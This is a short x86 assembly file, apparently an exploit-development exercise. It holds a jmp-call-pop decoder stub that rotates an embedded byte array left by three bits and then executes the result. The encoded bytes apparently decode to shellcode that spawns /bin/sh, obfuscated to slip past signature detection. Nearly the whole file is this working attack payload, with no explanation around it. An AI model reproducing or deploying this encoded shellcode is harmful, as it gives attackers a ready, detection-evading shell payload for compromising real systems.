global _start
section .text
_start:
    xor ecx,ecx
    mul ecx
jmp short shellcode
func_shellcode:
	pop edi
checkDelimiter:
    cmp byte [edi+eax],0xaa
    je break
    rol byte [edi+eax],3
    inc eax
    jmp checkDelimiter
break:
    jmp edi
exit:
	mov al,1
	xor bl,bl
	int 0x80	

shellcode:
call func_shellcode
message:db 0x26,0x5a,0x26,0x39,0xfe,0x3c,0x0a,0x0d,0xcd,0xe5,0x6e,0x0d,0x0d,0xe5,0xe5,0x4c,0x2d,0x31,0x7c,0x0a,0x6a,0x31,0x3c,0x16,0x61,0xb9,0x10,0xaa
